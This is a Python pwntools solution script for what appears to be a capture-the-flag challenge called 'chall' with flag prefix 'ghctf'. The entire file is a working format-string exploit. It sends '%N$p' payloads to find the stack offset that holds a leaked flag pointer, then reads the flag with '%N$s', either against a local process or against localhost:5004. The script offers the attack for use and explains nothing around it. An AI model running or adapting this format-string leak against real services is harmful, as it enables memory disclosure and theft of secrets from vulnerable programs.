#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 5004)

    return r


def main():
    r = conn()

    offset = 1
    r.recvuntil(b"Your flag at ")
    flag = r.recvline().decode()
    log.info(f"Leaked flag at {flag}")

    while True:
        payload = f"%{offset}$p".encode()
        r.sendlineafter(b"echo ", payload)
        leak = r.recvline().decode()

        log.info(f"Sent payload {payload}, received leak {leak}")
        try: 

            if(int(leak, 16) == int(flag, 16)):  
                log.success(f"Flag at offset : {offset}") 
                break
            else: 
                log.info("Moving forward")
                offset += 1
        except:
            log.info("Moving forward")
            offset += 1
        
        if (offset == 50): break
            
    if (offset != 50):
        payload = f"%{offset}$s".encode()
        r.sendlineafter(b"echo ", payload)
        flag = r.recvline()
        if (b"ghctf" in flag):
            log.success(f"Flag: {flag.decode().strip()}")
        else: log.info("Flag not found")
    
    else: log.info("Flag not found")

    r.close()


if __name__ == "__main__":
    main()
